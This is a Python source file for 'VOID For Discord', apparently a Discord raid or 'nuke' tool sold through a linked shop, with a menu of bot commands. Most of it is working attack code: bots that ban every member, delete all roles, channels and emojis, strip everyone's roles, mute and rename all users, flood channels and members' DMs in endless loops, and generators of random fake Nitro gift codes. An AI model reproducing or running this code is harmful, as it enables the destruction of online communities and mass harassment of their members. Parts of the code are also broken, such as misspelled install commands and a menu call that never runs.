try:
    import requests, ctypes, random, string, time, json, os, shutil, subprocess, pystyle, colored
    from pystyle import Write, Add, Colorate, Colors
    from colored import fg
    from itertools import cycle
    from multiprocessing.spawn import spawn_main
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
    import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
    import discord
    from discord.ext import commands
    import random
except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install ctypes")
    os.system("pip install colore")
    os.system("pip install otertools")
    os.system("pip install multiprocessing.spawn")
    os.system("pip install pystyle")
    os.system("pip install discord")
    os.system("pip instaññ fileinput")

import os, requests, random, threading, json, time, multiprocessing
from colorama import Fore
 


rnd = fg(98)
blue = fg(14)
gray = fg(8)
magenta = fg(5)
dark_blue = fg(4)
yellow12 = fg(226)
while True:
    def void1():
            System.Clear()
            Write.Print("""

                                                                        
        \t\t_______    ______      ____       ____________  ____________    
        \t\t\      |  |      | ____\_  \__   /            \ \           \   
        \t\t |     /  /     /|/           \ |\___/\  \\___/| \           \  
        \t\t |\    \  \    |//     /\      | \|____\  \___|/  |    /\     | 
        \t\t \ \    \ |    ||     |  |     |       |  |       |   |  |    | 
        \t\t  \|     \|    ||     |  |     |  __  /   / __    |    \/     | 
        \t\t   |\         /||     | /     /| /  \/   /_/  |  /           /| 
        \t\t   | \_______/ ||\      _____/ ||____________/| /___________/ | 
        \t\t    \ |     | / | \_____\   | / |           | /|           | /  
        \t\t     \|_____|/   \ |    |___|/  |___________|/ |___________|/   
        \t\t                  \|____|                                       
        \t\t════════════════════════════════════════════════════════════════════          
            \t\t\t· Created By: F3fe & C4rl0s
            \t\t\t· Visit our shop: https://exelentaccs.mysellix.io/
            \t\t\t· Join our discord: https://discord.gg/wnbUFe763v
            \t\t\t· VOID For Discord V1.5
        \t\t════════════════════════════════════════════════════════════════════
                        
            """, Colors.purple_to_blue, interval=0.000)
            print()
            print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")
            print(f"\t\t\t{blue}[{rnd}1{blue}]{rnd} Fastest Banall\t\t\t{blue}[{rnd}6{blue}]{rnd} Fastest Spammer")
            print(f"\t\t\t{blue}[{rnd}2{blue}]{rnd} Role Creator\t\t\t{blue}[{rnd}7{blue}]{rnd} Role Giver")
            print(f"\t\t\t{blue}[{rnd}3{blue}]{rnd} Role Deleter\t\t\t{blue}[{rnd}8{blue}]{rnd} Role Deleter")
            print(f"\t\t\t{blue}[{rnd}4{blue}]{rnd} Fastest Channel Creator\t\t{blue}[{rnd}9{blue}]{rnd} Fastest DM Spammer")
            print(f"\t\t\t{blue}[{rnd}5{blue}]{rnd} Fastest Channel Deleter\t\t{blue}[{rnd}10{blue}]{rnd} Mute Text All ")
            print(f"\n\t\t\t\t\t\t{blue}[{rnd}>>{blue}]{rnd} Next Pag")
            print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")

            opc = input("root@voidtool> ")

            # Fastest banall
            if opc == "1":
                token1 = input("Bot Token: ")
                prefix1 = input("Prefix: ")

                bot = commands.Bot(command_prefix=prefix1, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token bot: {token1}")
                    print(f"Prefix: {prefix1}")
                    print(f"Comando: {prefix1}banall")

                @bot.command(name="banall")
                async def banall(ctx):
                    await ctx.message.delete()
                                
                    for member in ctx.guild.members:
                        try:
                            await member.ban()
                            print(f"Baneado: {member.name}")
                        except Exception as e:
                            print(f"No se pudo banear a {member.name}: {e}")

                # Inicia el bot
                bot.run(token1)
                        
                    


            
            # Role Creator
            if opc == "2": 
                token2 = input("token: ")
                prefix2 = input("Prefix: ")
                name2 = input("Nombre de los roles: ")
                bot = commands.Bot(command_prefix=prefix2, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token2}")
                    print(f"Prefix: {prefix2}")
                    print(f"command: {prefix2}create_roles")
                @bot.command(name="create_role")
                async def create_role(ctx):
                    await ctx.message.delete()
                    while True:
                        await ctx.guild.create_role(name=name2)
                bot.run(token2)


            # Role Deleter
            if opc == "3": 
                token2 = input("token: ")
                prefix2 = input("Prefix: ")
                bot = commands.Bot(command_prefix=prefix2, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token2}")
                    print(f"Prefix: {prefix2}")
                    print(f"command: {prefix2}delete_roles")
                @bot.command(name="delete_role")
                async def delete_role(ctx):
                    await ctx.message.delete()
                    for role in ctx.guild.roles:             
                        if role.name != "@everyone":
                            await role.delete()
                            print("rol enliminado")
                bot.run(token2)


            # Channel Creator 
            if opc == "4":             
                token3 = input("Token Bot: ")
                prefix3 = input("Prefix Bot: ")
                name1 = input("Channel name: ")

                bot = commands.Bot(command_prefix=prefix3, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token bot: {token3}")
                    print(f"Prefix: {prefix3}")
                    print(f"Comando: {prefix3}create")
                @bot.command(name="create")
                async def create(ctx):
                    await ctx.message.delete()
                    while True:                   
                        await ctx.guild.create_text_channel(name1)
                        print(f"Canal {name1} creado con éxito")
                    
                bot.run(token3)

                
            # Channel Deleter
            if opc == "5":
                token3 = input("Token Bot: ")
                prefix3 = input("Prefix Bot: ")

                bot = commands.Bot(command_prefix=prefix3, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token bot: {token3}")
                    print(f"Prefix: {prefix3}")
                    print(f"Comando: {prefix3}create")
                @bot.command(name="delete")
                async def create(ctx, ):
                    await ctx.message.delete()
                    for channel in ctx.guild.text_channels or ctx.guild.voice_channels:
                        await channel.delete()
                        print(f"Canal {channel} borrado  con éxito")
                    
                bot.run(token3)


            # Spammer                       
            if opc == "6":
                token3 = input("Token Bot: ")
                prefix3 = input("Prefix Bot: ")
                texto = input("¿Que quieres spamear?: ")

                bot = commands.Bot(command_prefix=prefix3, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token3}")
                    print(f"Prefix: {prefix3}")
                    print(f"Command {prefix3}spam")
                
                @bot.command(name="spam")
                async def spam(ctx):
                    await ctx.message.delete()
                    while True:
                        for channel in ctx.guild.text_channels:
                            try:
                                await channel.send(texto)
                                print(f"Mensaje enviado a {channel.name}")
                            except discord.Forbidden:
                                print(f"Falta de permisos para enviar el mensaje en: {channel.name}")
                            
                bot.run(token3)


            #Role Giver
            if opc == "7":
                token4 = input("Token Bot: ")
                prefix = input("Prefix: ")
                id = int(input("Role ID: "))

                bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token4}")
                    print(f"Prefix: {prefix}")
                    print(f"Command {prefix}start")
                    
                @bot.command(name="start")
                async def start(ctx):
                    await ctx.message.delete()

                    rol = ctx.guild.get_role(id)
                    
                    if rol is not None:
                        for usuario in ctx.guild.members:
                            await usuario.add_roles(rol)
                            print("Rol Añadido Exitosamente")
                    else:
                        print("Rol no encontrado")
                bot.run(token4)


            #Role quiter
            if opc == "8":
                token4 = input("Token Bot: ")
                prefix = input("Prefix: ")

                bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token4}")
                    print(f"Prefix: {prefix}")
                    print(f"Command {prefix}start")
                
                @bot.command(name="start")
                async def eliminar_roles_servidor(ctx):
                    await ctx.message.delete()
                    servidor = ctx.guild
                    try:
                        for miembro in servidor.members:
                            await miembro.edit(roles=[])
                        await ctx.send("Se han eliminado todos los roles de todos los usuarios en el servidor.\n")
                    except discord.Forbidden:
                        print(f"No se ah podido quitar el rol a {miembro.display_name}")
                bot.run(token4)


            if opc == "9":
                token5 = input("Token Bot: ")
                prefix = input("Prefix: ")
                mensaje = input("Mensaje: ")

                bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token5}")
                    print(f"Prefix: {prefix}")
                    print(f"Command {prefix}enviar")
                    
                @bot.command(name="enviar")
                async def enviar_mensaje_a_todos(ctx):
                    await ctx.message.delete()
                    while True: 
                        for miembro in ctx.guild.members:
                            try:
                                
                                    await miembro.send(mensaje)
                                    print(f"Mensaje enviado a {miembro.name}: {mensaje}")
                            except discord.Forbidden:
                                    print(f"No tengo permisos para enviar mensajes a {miembro.name}.")
                            except Exception as e:
                                print(f"No se pudo enviar el mensaje a {miembro.name}: {str(e)}")
                bot.run(token5)


            if opc == "10":
                token5 = input("Token Bot: ")
                prefix = input("Prefix: ")

                bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token5}")
                    print(f"Prefix: {prefix}")
                    print(f"Command {prefix}mute_all")
                @bot.command(name="mute_all")   
                async def mute_all(ctx):
                    await ctx.message.delete()

                    while True: 
                        muted_role = await ctx.guild.create_role(name="MUTED-TEXT")

                        permissions = discord.PermissionOverwrite()
                        permissions.send_messages = False

                        for channel in ctx.guild.text_channels:
                            await channel.set_permissions(muted_role, overwrite=permissions)
                        
                        for member in ctx.guild.members:
                            await member.add_roles(muted_role)

                        print("Se han quitado los permisos de enviar mensajes a todos los usuarios del servidor.")

                    
                bot.run(token5)


            if opc ==">" or opc==">>":
                void2()
    def void2():
        System.Clear()
        Write.Print("""

                                                                        
        \t\t_______    ______      ____       ____________  ____________    
        \t\t\      |  |      | ____\_  \__   /            \ \           \   
        \t\t |     /  /     /|/           \ |\___/\  \\___/| \           \  
        \t\t |\    \  \    |//     /\      | \|____\  \___|/  |    /\     | 
        \t\t \ \    \ |    ||     |  |     |       |  |       |   |  |    | 
        \t\t  \|     \|    ||     |  |     |  __  /   / __    |    \/     | 
        \t\t   |\         /||     | /     /| /  \/   /_/  |  /           /| 
        \t\t   | \_______/ ||\      _____/ ||____________/| /___________/ | 
        \t\t    \ |     | / | \_____\   | / |           | /|           | /  
        \t\t     \|_____|/   \ |    |___|/  |___________|/ |___________|/   
        \t\t                  \|____|                                       
        \t\t════════════════════════════════════════════════════════════════════          
            \t\t\t· Created By: F3fe & C4rl0s>
            \t\t\t· Visit our shop: https://exelentaccs.mysellix.io/
            \t\t\t· Join our discord: https://discord.gg/wnbUFe763v
            \t\t\t· VOID For Discord V1.5
        \t\t════════════════════════════════════════════════════════════════════
                        
            """, Colors.purple_to_blue, interval=0.000)
        print()
        print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")
        print(f"\t\t\t{blue}[{rnd}11{blue}]{rnd} Nitro Gift Generator\t\t{blue}[{rnd}16{blue}]{rnd} All Servers Channel Creator")
        print(f"\t\t\t{blue}[{rnd}12{blue}]{rnd} Nitro promo Generator\t\t{blue}[{rnd}17{blue}]{rnd} All Servers Channel Deleter")
        print(f"\t\t\t{blue}[{rnd}13{blue}]{rnd} Reply Spammer\t\t\t{blue}[{rnd}18{blue}]{rnd} Emoji Creator")
        print(f"\t\t\t{blue}[{rnd}14{blue}]{rnd} Emoji Spammer\t\t\t{blue}[{rnd}19{blue}]{rnd} Emoji Deleter")
        print(f"\t\t\t{blue}[{rnd}15{blue}]{rnd} Server Spam\t\t\t{blue}[{rnd}20{blue}]{rnd} Nickname Changer")
        print(f"\n\t\t\t\t\t{blue}{rnd}Back Pag {blue}{rnd}{blue}[{rnd}<<{blue}]\t{blue}[{rnd}>>{blue}]{rnd} Next Pag")
        print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")


        opc2 = input("root@voidtool> ")
                
        if opc2 == "<" or opc2 == "<<":
            void1()
        
        if opc2 == ">" or ">>":
            void3


        if opc2 == "11":
            lista = string.ascii_letters + string.digits
            veces = int(input("Cantidad: "))
            lista_codigos = []
            for i in range(veces):
                        
                codigo =  ''.join(random.choice(lista) for _ in range(16))
                lista_codigos.append("https://discord.gift/" + codigo)
                codigos = print("https://discord.gift/" + codigo)
                            
                dir_name = "txt's"

                os.makedirs(dir_name, exist_ok=True)

                file_path = os.path.join(dir_name, 'codes.txt')

                with open(file_path, 'w') as f:
                    for codigo in lista_codigos:
                        f.write(codigo + "\n")

                
        if opc2 == "12":
            lista = string.ascii_letters + string.digits
            veces = int(input("Cantidad: "))
            lista_codigos = []
            for i in range(veces):
                        
                codigo =  ''.join(random.choice(lista) for _ in range(16))
                lista_codigos.append("https://discord.promos/" + codigo)
                codigos = print("https://discord.promos/" + codigo)
                            
                dir_name = "txt's"

                os.makedirs(dir_name, exist_ok=True)

                file_path = os.path.join(dir_name, 'promos.txt')

                with open(file_path, 'w') as f:
                    for codigo in lista_codigos:
                        f.write(codigo + "\n")
                            
            
        if opc2 == "13":
            token6 = input("Token Bot: ")
            prefix = input("Prefix: ")
            message_id = input("Message ID: ")
            msg = input("Reply message: ")

            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f"Token Bot: {token6}")
                print(f"Prefix: {prefix}")
                print(f"Command {prefix}")
            @bot.command(name="reply")
            async def responder(ctx):
                while True:
                    message = await ctx.channel.fetch_message(message_id)
                    await message.reply(msg)
            bot.run(token6)
            
    
        # emoji spammer    
        if opc2 == "14":
            emojis = ["😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "😊", "😇", "🙂", "🙃", "😉", "😌", "😍", "🥰", "😘", "😗", "😙", "😚", "😋", "😛", "😜", "😝", "🤑", "🤗", "🤓", "😎", "🧐", "😏", "😒", "😞", "😔", "😟", "😕", "🙁", "☹️", "😣", "😖", "😫", "😩", "😢", "😭", "😤", "😠", "😡", "🤬", "🤯", "😳", "😱", "😨", "😰", "😥", "😓", "🤗", "🤔", "🤭", "🤫", "🤥", "😶", "😐", "😑", "😬", "🙄", "😯", "😦", "😧", "😮", "😲", "😴", "🤤", "😪", "😵", "🤐", "🥴", "🤢", "🤮", "🤧", "😷", "🤒", "🤕", "🤑", "🤠", "😈", "👿", "👹", "👺", "💀", "☠️", "👻", "👽", "👾", "🤖", "💩", "🙊", "💋", "💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "❣️", "💔", "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣", "💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "👋🏻", "👋🏼", "👋🏽", "👋🏾", "👋🏿", "👋‍♀️", "👋🏻‍♀️", "👋🏼‍♀️", "👋🏽‍♀️", "👋🏾‍♀️", "👋🏿‍♀️", "👋‍♂️", "👋🏻‍♂️", "👋🏼‍♂️", "👋🏽‍♂️", "👋🏾‍♂️", "👋🏿‍♂️", "👍", "👍🏻", "👍🏼", "👍🏽", "👍🏾", "👍🏿", "👎", "👎🏻", "👎🏼", "👎🏽", "👎🏾", "👎🏿", "👊", "👊🏻", "👊🏼", "👊🏽", "👊🏾", "👊🏿", "✊", "✊🏻", "✊🏼", "✊🏽", "✊🏾", "✊🏿", "🤛", "🤛🏻", "🤛🏼", "🤛🏽", "🤛🏾", "🤛🏿", "🤜", "🤜🏻", "🤜🏼", "🤜🏽", "🤜🏾", "🤜🏿", "🤝", "🤞", "🤞🏻", "🤞🏼", "🤞🏽", "🤞🏾", "🤞🏿", "✌", "✌🏻", "✌🏼", "✌🏽", "✌🏾", "✌🏿", "🤘", "🤘🏻", "🤘🏼", "🤘🏽", "🤘🏾", "🤘🏿", "👌", "👌🏻", "👌🏼", "👌🏽", "👌🏾", "👌🏿", "🤌", "🤌🏻", "🤌🏼", "🤌🏽", "🤌🏾", "🤌🏿", "🤏", "🤏🏻", "🤏🏼", "🤏🏽", "🤏🏾", "🤏🏿", "✍", "✍🏻", "✍🏼", "✍🏽", "✍🏾", "✍🏿", "👆", "👆🏻", "👆🏼", "👆🏽", "👆🏾", "👆🏿", "👇", "👇🏻", "👇🏼", "👇🏽", "👇🏾", "👇🏿", "👉", "👉🏻", "👉🏼", "👉🏽", "👉🏾", "👉🏿", "👈", "👈🏻", "👈🏼", "👈🏽", "👈🏾", "👈🏿", "🖕", "🖕🏻", "🖕🏼", "🖕🏽", "🖕🏾", "🖕🏿", "🤞", "🤞🏻", "🤞🏼", "🤞🏽", "🤞🏾", "🤞🏿", "🤟", "🤟🏻", "🤟🏼", "🤟🏽", "🤟🏾", "🤟🏿", "🤘", "🤘🏻", "🤘🏼", "🤘🏽", "🤘🏾", "🤘🏿", "🤙", "🤙🏻", "🤙🏼", "🤙🏽", "🤙🏾", "🤙🏿", "👈", "👈🏻", "👈🏼", "👈🏽", "👈🏾", "👈🏿", "👉", "👉🏻", "👉🏼", "👉🏽", "👉🏾", "👉🏿", "👆", "👆🏻", "👆🏼", "👆🏽", "👆🏾", "👆🏿", "👇", "👇🏻", "👇🏼", "👇🏽", "👇🏾", "👇🏿", "☝️", "☝🏻", "☝🏼", "☝🏽", "☝🏾", "☝🏿", "👍", "👍🏻", "👍🏼", "👍🏽", "👍🏾", "👍🏿", "👎", "👎🏻", "👎🏼", "👎🏽", "👎🏾", "👎🏿", "✋", "✋🏻", "✋🏼", "✋🏽", "✋🏾", "✋🏿", "🤚", "🤚🏻", "🤚🏼", "🤚🏽", "🤚🏾", "🤚🏿", "🖐️", "🖐🏻", "🖐🏼", "🖐🏽", "🖐🏾", "🖐🏿", "🖖", "🖖🏻", "🖖🏼", "🖖🏽", "🖖🏾", "🖖🏿", "👌", "👌🏻", "👌🏼", "👌🏽", "👌🏾", "👌🏿", "🤏", "🤏🏻", "🤏🏼", "🤏🏽", "🤏🏾", "🤏🏿", "✍", "✍🏻", "✍🏼", "✍🏽", "✍🏾", "✍🏿", "👋", "👋🏻", "👋🏼", "👋🏽", "👋🏾", "👋🏿", "👋‍♀️", "👋🏻‍♀️", "👋🏼‍♀️", "👋🏽‍♀️", "👋🏾‍♀️", "👋🏿‍♀️", "👋‍♂️", "👋🏻‍♂️", "👋🏼‍♂️", "👋🏽‍♂️", "👋🏾‍♂️", "👋🏿‍♂️", "👍", "👍🏻", "👍🏼", "👍🏽", "👍🏾", "👍🏿", "👎", "👎🏻", "👎🏼", "👎🏽", "👎🏾", "👎🏿", "👊", "👊🏻", "👊🏼", "👊🏽", "👊🏾", "👊🏿", "✊", "✊🏻", "✊🏼", "✊🏽", "✊🏾", "✊🏿", "🤛", "🤛🏻", "🤛🏼", "🤛🏽", "🤛🏾", "🤛🏿", "🤜", "🤜🏻", "🤜🏼", "🤜🏽", "🤜"]

            token6 = input("Token Bot: ")
            prefix = input("Prefix: ")
            agregar = input(print(f"""
        {dark_blue} Quieres Añadir un texto personalizado?
        [1] Si.
        [2] No
                            
"""))
            

            if agregar =="1":       
                msg = input("Message:")

            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f"Token Bot: {token6}")
                print(f"Prefix: {prefix}")
                print(f"Command {prefix}")

            @bot.command(name="spam")
            async def spam(ctx):
                await ctx.message.delete()
                chanels = ctx.guild.text_channels
                if agregar =="1":
                    while True:
                                randon = ''.join(random.sample(emojis, 5)).replace("'", "").replace("[", "")
                                

                                try:
                                    await ctx.send(f"{randon} {msg}")
                                    print(f"Mensaje enviado")
                                except discord.Forbidden:
                                    print(f"Falta de permisos para enviar el mensaje en")
                if agregar =="2":
                    while True:
                                for chanel in chanels:
                                    randon = random.sample(emojis, 5)
                                    try:
                                        await chanel.send(randon)
                                        print(f"Mensaje enviado")
                                    except discord.Forbidden:
                                        print(f"Falta de permisos para enviar el mensaje en")                    
            bot.run(token6)
            
       
        # Guilds Spammer
        if opc2 == "15":
            token7 = input("Token Bot: ")
            mensaje = input("Mesaje a comunicar: ")

            bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f"Token Bot: {token7}")
                for guild in bot.guilds:
                    channel = await guild.create_text_channel("📢┆comunicado importante")
                    await channel.send(mensaje)
                    print(mensaje)
            bot.run(token7)

        
        if opc2 == "16":
            token7 = input("Token Bot: ")
            name = input("Channel Name: ")
            cantidad = input("Cantidad: ")

            bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f"Bot conectado como {bot.user.name}")
                while True:
                    for guild in bot.guilds:
                        for _ in range(cantidad):
                            await guild.create_text_channel(name)
                        print(f"canales de texto creados en {guild.name}")
            bot.run(token7)
        

        if opc2 == "17":
            token7 = input("Token Bot: ")
            name = input("Channel Name: ")

            bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                try:
                    for guild in bot.guilds:
                        for channel in guild.channels:
                            channel = discord.utils.get(guild.text_channels,name=name)
                            if channel:
                                await channel.delete()
                                print(f"Canal de texto '{name}' eliminado en {guild.name}")
                            else:
                                print(f"No se encontró el canal '{name}' en {guild.name}")
                except:
                    print("ERROR!")
                            
                        
                        
            bot.run(token7)

        if opc2 == "18":
            token7 = input("Token Bot: ")
            name = input("Channel Name: ")
            prefix = input("Bot Prefix: ")


            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f'token Bot: {token7}')
                print(f'command: {prefix}start')
            
            @bot.command(name="start")
            async def start(ctx):
                await ctx.message.delete()
                guild = ctx.guild
                while True:
                    with open('emoji.png', 'rb') as f:
                        await guild.create_custom_emoji(name="hacked", image=f.read())
                    print("Emoji Creado con exito!")



            
        if opc2 == "19":
            token7 = input("Token Bot: ")
            name = input("Emoji Name: ")
            prefix = input("Bot Prefix: ")


            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f'token Bot: {token7}')
                print(f'command: {prefix}start')
            
            @bot.command(name="start")
            async def start(ctx):
                await ctx.message.delete()
                guild = ctx.guild
                emoji = discord.utils.get(ctx.guild.emojis, name=name)
                while True:
                    for emoji in ctx.guild.emojis:
                        await emoji.delete()
                        print("Emoji borrado con exito!")


            bot.run(token7)


        if opc2 == "20":
            token7 = input("Token Bot: ")            
            prefix = input("Bot Prefix: ")
            name = input("Users Name: ")


            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

            @bot.event
            async def on_ready():
                print(f'token: {token7}')
                print(f'prefix: {prefix}')
                print(f'command: {prefix}start')


            @bot.command(name="start")
            async def renamer(ctx):
                await ctx.message.delete()
                try:
                    for member in ctx.guild.members:
                        await member.edit(nick=name)
                        print(f'Name Changed to: {member}')
                except Exception:
                    print(f"{blue}[{rnd}~{blue}]{rnd} {dark_blue}Missing Permissions")

            bot.run(token7)
            
        if opc2 ==">" or opc2==">>":
                void3()
    def void3():
        System.Clear()
        Write.Print("""

                                                                        
        \t\t_______    ______      ____       ____________  ____________    
        \t\t\      |  |      | ____\_  \__   /            \ \           \   
        \t\t |     /  /     /|/           \ |\___/\  \\___/| \           \  
        \t\t |\    \  \    |//     /\      | \|____\  \___|/  |    /\     | 
        \t\t \ \    \ |    ||     |  |     |       |  |       |   |  |    | 
        \t\t  \|     \|    ||     |  |     |  __  /   / __    |    \/     | 
        \t\t   |\         /||     | /     /| /  \/   /_/  |  /           /| 
        \t\t   | \_______/ ||\      _____/ ||____________/| /___________/ | 
        \t\t    \ |     | / | \_____\   | / |           | /|           | /  
        \t\t     \|_____|/   \ |    |___|/  |___________|/ |___________|/   
        \t\t                  \|____|                                       
        \t\t════════════════════════════════════════════════════════════════════          
            \t\t\t· Created By: F3fe & C4rl0s>
            \t\t\t· Visit our shop: https://exelentaccs.mysellix.io/
            \t\t\t· Join our discord: https://discord.gg/wnbUFe763v
            \t\t\t· VOID For Discord V1.5
        \t\t════════════════════════════════════════════════════════════════════
                        
            """, Colors.purple_to_blue, interval=0.000)
        print()
        print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")
        print(f"\t\t\t\t\t\t{yellow12}Coming Soon...")
        print(f"\n\t\t\t\t\t{blue}{rnd}Back Pag {blue}{rnd}{blue}[{rnd}<<{blue}]\t{blue}[{rnd}>>{blue}]{rnd} Next Pag")
        print(f"{magenta}═════════════════════════════════════════════════════════════════════════════════════════════════════")


        opc2 = input("root@voidtool> ")
                
        if opc2 == "<" or opc2 == "<<":
            void2()
                
                            
    void1()
    
